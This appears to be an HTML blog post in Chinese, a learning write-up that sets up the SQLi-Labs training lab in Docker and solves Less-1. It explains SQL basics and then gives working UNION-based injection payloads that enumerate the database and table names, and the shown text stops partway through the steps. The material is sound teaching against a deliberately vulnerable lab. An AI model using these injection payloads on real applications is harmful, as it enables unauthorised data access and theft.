@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#405477"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/cm.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/cm.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#405477">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"copycode":{"enable":false,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="搭建SQLi-Labs靶场 12345678# 搜索 sqli-labs 镜像 (可选)docker search sqli-labs# 拉取一个常用的镜像docker pull acgpiano&#x2F;sqli-labs# 运行容器 (-p 81:80 表示将容器的80端口映射到宿主机的81端口)docker run -dt --name sqli-labs -p 81:80 acgpiano&#x2F;sq">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入（靶场搭建 及 Less-1）">
+<meta property="og:url" content="http://example.com/2025/08/21/CTF/sql_1/index.html">
+<meta property="og:site_name" content="CMingの小站">
+<meta property="og:description" content="搭建SQLi-Labs靶场 12345678# 搜索 sqli-labs 镜像 (可选)docker search sqli-labs# 拉取一个常用的镜像docker pull acgpiano&#x2F;sqli-labs# 运行容器 (-p 81:80 表示将容器的80端口映射到宿主机的81端口)docker run -dt --name sqli-labs -p 81:80 acgpiano&#x2F;sq">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-08-21T14:45:30.000Z">
+<meta property="article:modified_time" content="2025-08-22T14:30:31.118Z">
+<meta property="article:author" content="CMing-迟明">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2025/08/21/CTF/sql_1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2025/08/21/CTF/sql_1/","path":"2025/08/21/CTF/sql_1/","title":"SQL注入（靶场搭建 及 Less-1）"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SQL注入（靶场搭建 及 Less-1） | CMingの小站</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">CMingの小站</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-friends"><a href="/friends/" rel="section"><i class="fa fa-link fa-fw"></i>friends</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%90%AD%E5%BB%BAsqli-labs%E9%9D%B6%E5%9C%BA"><span class="nav-number">1.</span> <span class="nav-text">搭建SQLi-Labs靶场</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-1-%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8Bget%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">Less-1
+基于报错的单引号字符型GET注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#select"><span class="nav-number">2.1.</span> <span class="nav-text">select</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#union"><span class="nav-number">2.2.</span> <span class="nav-text">union</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%97%E5%90%8D%E8%A7%84%E5%88%99"><span class="nav-number">2.2.1.</span> <span class="nav-text">列名规则</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#row-%E7%9A%84%E5%86%85%E5%AE%B9"><span class="nav-number">2.2.2.</span> <span class="nav-text">$row 的内容</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#order-by"><span class="nav-number">2.3.</span> <span class="nav-text">order by</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#limit"><span class="nav-number">2.4.</span> <span class="nav-text">limit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%E8%AF%B4%E6%98%8E"><span class="nav-number">2.4.1.</span> <span class="nav-text">示例说明</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%93%E5%90%8D%E8%A1%A8%E5%90%8D%E5%88%97%E5%90%8D"><span class="nav-number">2.5.</span> <span class="nav-text">库名表名列名</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">2.5.1.</span> <span class="nav-text">1. 查所有数据库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D"><span class="nav-number">2.5.2.</span> <span class="nav-text">2. 查所有表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="nav-number">2.5.3.</span> <span class="nav-text">3. 查所有字段名</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#group_concat"><span class="nav-number">2.6.</span> <span class="nav-text">group_concat</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-1-%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.</span> <span class="nav-text">Less-1 解题步骤</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="CMing-迟明"
+      src="/images/cm.png">
+  <p class="site-author-name" itemprop="name">CMing-迟明</p>
+  <div class="site-description" itemprop="description">Coding with brush</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/CC-Ming" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;CC-Ming" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/08/21/CTF/sql_1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cm.png">
+      <meta itemprop="name" content="CMing-迟明">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CMingの小站">
+      <meta itemprop="description" content="Coding with brush">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SQL注入（靶场搭建 及 Less-1） | CMingの小站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入（靶场搭建 及 Less-1）
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-08-21 22:45:30" itemprop="dateCreated datePublished" datetime="2025-08-21T22:45:30+08:00">2025-08-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-08-22 22:30:31" itemprop="dateModified" datetime="2025-08-22T22:30:31+08:00">2025-08-22</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="搭建sqli-labs靶场">搭建SQLi-Labs靶场</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索 sqli-labs 镜像 (可选)</span></span><br><span class="line">docker search sqli-labs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拉取一个常用的镜像</span></span><br><span class="line">docker pull acgpiano/sqli-labs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行容器 (-p 81:80 表示将容器的80端口映射到宿主机的81端口)</span></span><br><span class="line">docker run -dt --name sqli-labs -p 81:80 acgpiano/sqli-labs</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>可能遇到的网络问题： <figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Error </span>response from daemon: Get &quot;https://index.docker.io/v1/search?q=sqli-labs&amp;n=25&quot;: dial tcp [2a03:2880:f130:83:face:b00c:0:25de]:443: i/o timeout</span><br><span class="line">或者</span><br><span class="line"><span class="keyword">Error </span>response from daemon: Get &quot;https://index.docker.io/v1/search?q=sqli-labs&amp;n=25&quot;: read tcp [2409:8924:a62a:2ff:4905:c08b:ddb3:cc4d]:47256-&gt;[2600:1f18:2148:bc01:8ea1:e481:4fa3:8934]:443: read: connection reset by peer</span><br></pre></td></tr></table></figure> 我的解决方案： 1.
+WSL2（如果你是VM虚拟机我猜应该也差不多）使用 NAT
+模式（之前我设置的是镜像模式） 2. 主机开启 TUN 模式</p>
+<h2 id="less-1-基于报错的单引号字符型get注入">Less-1
+基于报错的单引号字符型GET注入</h2>
+<p>补充前置知识</p>
+<p>源代码在<code>/var/www/html</code>中</p>
+<h3 id="select">select</h3>
+<p>SELECT 1, 2, 3 是一个有效的 SQL
+语句（不需要表名），它的意思是：选择三个固定的数值（1, 2,
+3）作为查询</p>
+<h3 id="union">union</h3>
+<p>使用 UNION 时，每个 SELECT
+语句必须具有相同数量的列，且对应列的数据类型必须相似</p>
+<p>假设有两个表：</p>
+<p><strong>users 表：</strong> <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">id | name  | age</span></span><br><span class="line"><span class="section">---+-------+-----</span></span><br><span class="line">1  | Alice | 25</span><br><span class="line">2  | Bob   | 30</span><br></pre></td></tr></table></figure></p>
+<p><strong>products 表：</strong> <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">id | product_name | price</span></span><br><span class="line"><span class="section">---+--------------+-------</span></span><br><span class="line">1  | Laptop       | 1000</span><br><span class="line">2  | Phone        | 500</span><br></pre></td></tr></table></figure></p>
+<p>执行： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT name FROM users </span></span><br><span class="line"><span class="string">        UNION </span></span><br><span class="line"><span class="string">        SELECT product_name FROM products&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure> 结果集： <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">name</span></span><br><span class="line"><span class="section">-----</span></span><br><span class="line">Alice</span><br><span class="line">Bob  </span><br><span class="line">Laptop</span><br><span class="line">Phone</span><br></pre></td></tr></table></figure></p>
+<p>选择多列 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name, age <span class="keyword">FROM</span> users </span><br><span class="line"><span class="keyword">UNION</span> </span><br><span class="line"><span class="keyword">SELECT</span> product_name, price <span class="keyword">FROM</span> products</span><br></pre></td></tr></table></figure></p>
+<p>结果集 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">name   | age</span></span><br><span class="line"><span class="section">-------+------</span></span><br><span class="line">Alice  | 25</span><br><span class="line">Bob    | 30  </span><br><span class="line">Laptop | 1000</span><br><span class="line">Phone  | 500</span><br></pre></td></tr></table></figure></p>
+<h4 id="列名规则">列名规则</h4>
+<ul>
+<li>使用<strong>第一个 SELECT 语句的列名</strong>作为关联数组的键</li>
+<li>即使后续SELECT的列名不同，也使用第一个的列名</li>
+</ul>
+<h4 id="row-的内容"><code>$row</code> 的内容</h4>
+<p><code>mysql_fetch_array()</code>：从结果集中获取下一行数据，并将该行数据转换为一个数组</p>
+<p><code>$row</code>
+是一个包含两种索引方式的数组，既包含数字索引也包含关联索引。</p>
+<p><code>mysql_fetch_array($result)</code> 返回： - <code>[0]</code> =
+name值, <code>[1]</code> = age值 - <code>['name']</code> = name值,
+<code>['age']</code> = age值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$row</span> = [</span><br><span class="line">    <span class="comment">// 数字索引（按SELECT顺序）</span></span><br><span class="line">    <span class="number">0</span> =&gt; <span class="string">&#x27;Alice&#x27;</span>,    <span class="comment">// 第一个SELECT列的值</span></span><br><span class="line">    <span class="number">1</span> =&gt; <span class="number">25</span>,         <span class="comment">// 第二个SELECT列的值</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 关联索引（按列名）</span></span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;Alice&#x27;</span>,  <span class="comment">// name列的值</span></span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>  =&gt; <span class="number">25</span>        <span class="comment">// age列的值</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+<p>所以 <code>?id=-1' union select 1,2,3 --+</code>
+中的1，没有回显是因为作为<code>$row['id']</code>的值了，而源代码只取了<code>$row['username']</code>
+和 <code>$row['password']</code></p>
+<h3 id="order-by">order by</h3>
+<p>ORDER BY 关键字用于对结果集按照一个列或者多个列进行排序</p>
+<p>ORDER BY 2 中的数字表示： &gt;1 = SELECT 列表中的第一个列<br />
+&gt;2 = SELECT 列表中的第二个列<br />
+&gt;3 = SELECT 列表中的第三个列</p>
+<p>数字超出 SELECT 列表范围也会报错</p>
+<h3 id="limit">limit</h3>
+<p><code>LIMIT 0,1</code> 是 SQL
+中的限制子句，意思是：<strong>从第0行开始，返回1行数据</strong>。</p>
+<p><code>LIMIT offset, count</code> 的格式： - <strong>第一个数字
+(0)</strong>：偏移量（从0开始计数） - <strong>第二个数字
+(1)</strong>：要返回的行数</p>
+<p>所以 <code>LIMIT 0,1</code> 表示： -
+从<strong>第1行</strong>开始（偏移量0表示跳过0行，即从第1行开始） -
+返回<strong>1行</strong>数据</p>
+<h4 id="示例说明">示例说明</h4>
+<p>假设 users 表有数据： <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">id | name</span></span><br><span class="line"><span class="section">---+------</span></span><br><span class="line">1  | Alice</span><br><span class="line">2  | Bob  </span><br><span class="line">3  | Charlie</span><br><span class="line">4  | David</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<p>1.<code>LIMIT 0,1</code></p>
+<p>结果： <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">id | name</span></span><br><span class="line"><span class="section">---+------</span></span><br><span class="line">1  | Alice</span><br></pre></td></tr></table></figure></p>
+<p>2.<code>LIMIT 1,1</code></p>
+<p>结果： <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">id | name  </span></span><br><span class="line"><span class="section">---+------</span></span><br><span class="line">2  | Bob</span><br></pre></td></tr></table></figure></p>
+<p>3.<code>LIMIT 2,2</code></p>
+<p>结果： <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">id | name</span></span><br><span class="line"><span class="section">---+---------</span></span><br><span class="line">3  | Charlie</span><br><span class="line">4  | David</span><br></pre></td></tr></table></figure></p>
+<h3 id="库名表名列名">库名表名列名</h3>
+<p><code>database()</code> 可以输出数据库的名字</p>
+<p>MySQL 里有个库叫
+<strong><code>information_schema</code></strong>。它不存业务数据，只存<strong>所有数据库、表、字段的名字</strong></p>
+<h4 id="查所有数据库名">1. 查所有数据库名</h4>
+<ul>
+<li><strong>表名：</strong> <code>schemata</code></li>
+<li><strong>关键列：</strong> <code>schema_name</code></li>
+<li><strong>怎么用：</strong> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> schema_name <span class="keyword">FROM</span> information_schema.schemata;</span><br></pre></td></tr></table></figure> &gt;
+结果：<code>mysql</code>, <code>test</code>, <code>security</code> ...
+(返回所有数据库名)</li>
+</ul>
+<h4 id="查所有表名">2. 查所有表名</h4>
+<ul>
+<li><strong>表名：</strong> <code>tables</code></li>
+<li><strong>关键列：</strong>
+<ul>
+<li><code>table_schema</code> (表属于哪个<strong>数据库</strong>)</li>
+<li><code>table_name</code> (<strong>表</strong>的名字)</li>
+</ul></li>
+<li><strong>怎么用（注入时最常用）：</strong> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables </span><br><span class="line"><span class="keyword">WHERE</span> table_schema <span class="operator">=</span> <span class="string">&#x27;security&#x27;</span>;</span><br></pre></td></tr></table></figure> &gt;
+结果：<code>users</code>, <code>emails</code> ...
+(返回<code>security</code>数据库里的所有表名)</li>
+</ul>
+<h4 id="查所有字段名">3. 查所有字段名</h4>
+<ul>
+<li><strong>表名：</strong> <code>columns</code></li>
+<li><strong>关键列：</strong>
+<ul>
+<li><code>table_schema</code> (字段属于哪个<strong>数据库</strong>)</li>
+<li><code>table_name</code> (字段属于哪个<strong>表</strong>)</li>
+<li><code>column_name</code> (<strong>字段</strong>的名字)</li>
+</ul></li>
+<li><strong>怎么用：</strong> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns </span><br><span class="line"><span class="keyword">WHERE</span> table_schema <span class="operator">=</span> <span class="string">&#x27;security&#x27;</span> <span class="keyword">AND</span> table_name <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span>;</span><br></pre></td></tr></table></figure> &gt; 结果：<code>id</code>,
+<code>username</code>, <code>password</code> ...
+(返回<code>security</code>库的<code>users</code>表里所有字段名)</li>
+</ul>
+<h3 id="group_concat">group_concat</h3>
+<p>正常情况下，一个 <code>SELECT</code>
+查询会返回多行数据。<code>GROUP_CONCAT()</code>
+的作用就是把多行数据合并成一行，用一个指定的符号（比如逗号）隔开
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GROUP_CONCAT([<span class="keyword">DISTINCT</span>] 要合并的字段 [<span class="keyword">ORDER</span> <span class="keyword">BY</span> 排序字段] [SEPARATOR <span class="string">&#x27;分隔符&#x27;</span>])</span><br></pre></td></tr></table></figure> 查询所有表名 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> group_concat(table_name) <span class="keyword">FROM</span> information_schema.tables</span><br><span class="line"><span class="keyword">WHERE</span> table_schema<span class="operator">=</span>&quot;security&quot;</span><br></pre></td></tr></table></figure></p>
+<h2 id="less-1-解题步骤">Less-1 解题步骤</h2>
+<ol type="1">
+<li><p>根据提示在url栏里添加
+<code>?id=1</code>，结果正常显示用户名密码，因此可以枚举<code>id</code>的值来获取所有的用户名密码</p></li>
+<li><p>判断是字符型还是数字型，若<code>?id=2-1</code>出现的结果与<code>?id=1</code>的结果相同就是数字型，否则是字符型
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>; <span class="comment">// 这是字符型，因为$id被单引号包裹，是单引号闭合</span></span><br><span class="line"><span class="comment">//其他常见闭合类型：</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM products WHERE name = \&quot;<span class="subst">$product_name</span>\&quot;&quot;</span>; <span class="comment">// 双引号闭合</span></span><br><span class="line"><span class="comment">// 单引号加括号闭合 &#x27;)   -常见于PHP框架、INSERT/UPDATE语句</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO logs (message, user) VALUES (&#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$user</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET email = &#x27;<span class="subst">$email</span>&#x27; WHERE id = <span class="subst">$id</span>&quot;</span>; <span class="comment">//WHERE子句也可能有括号</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO table (col1, col2) VALUES (\&quot;<span class="subst">$val1</span>\&quot;, \&quot;<span class="subst">$val2</span>\&quot;)&quot;</span>; <span class="comment">// 双引号加括号闭合</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 所以没有闭合的就是数字型</span></span><br></pre></td></tr></table></figure></p></li>
+<li><p>判断闭合类似（根据是否报错慢慢试）,这里结果是单引号闭合</p></li>
+<li><p>目的是使用联合查询，所以要确定前面一个查询查了几列，保证列数相同
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>&#x27; union <span class="keyword">select</span> <span class="number">1</span> <span class="comment">--+</span></span><br><span class="line">?id=<span class="number">1</span>&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="comment">--+</span></span><br><span class="line">?id=<span class="number">1</span>&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line">结果是<span class="number">3</span>列的时候没有报错</span><br></pre></td></tr></table></figure> <img
+src="https://gcore.jsdelivr.net/gh/CC-Ming/picture/imgs/20250822221301.png"
+alt="20250822221301" /></p></li>
+<li><p>确定回显，由于第一个查询语句是对的，所以没有回显，我们设法将第一个查询语句的结果集为空
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span>&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure> <img
+src="https://gcore.jsdelivr.net/gh/CC-Ming/picture/imgs/20250822221348.png"
+alt="20250822221348" /></p></li>
+<li><p>查询库名，这里结果为security <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span>&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database() <span class="comment">--+</span></span><br></pre></td></tr></table></figure></p></li>
+<li><p>查询表名, 猜测大概率是 users 表，不使用group_concat也可以用limit
+0,1的方式逐个查询 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union <span class="keyword">SELECT</span> <span class="number">1</span>, <span class="number">2</span>, group_concat(table_name) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema = <span class="string">&#x27;security&#x27;</span>; --+</span><br></pre></td></tr></table></figure> <img
+src="https://gcore.jsdelivr.net/gh/CC-Ming/picture/imgs/20250822222016.png"
+alt="20250822222016" /></p></li>
